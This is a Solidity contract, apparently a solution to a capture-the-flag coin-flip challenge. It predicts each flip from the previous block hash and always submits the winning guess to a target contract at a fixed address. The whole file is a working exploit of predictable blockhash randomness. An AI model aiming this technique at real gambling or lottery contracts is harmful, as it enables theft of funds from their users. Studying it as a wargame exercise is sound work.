/**
 *Submitted for verification at Etherscan.io on 2022-04-08
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.5.0 <0.6.0;

contract CoinFlip {
    function flip(bool _guess) public returns(bool);
}

contract hackCoinFlip {
    CoinFlip public originalContract = CoinFlip(0x1589Ea50cc9307EFC57f62847c926BA49FFc6607); 
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function hackFlip(bool _guess) public {
        
        // pre-deteremine the flip outcome
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // If I guessed correctly, submit my guess
        if (side == _guess) {
            originalContract.flip(_guess);
        } else {
        // If I guess incorrectly, submit the opposite
            originalContract.flip(!_guess);
        }
    }
}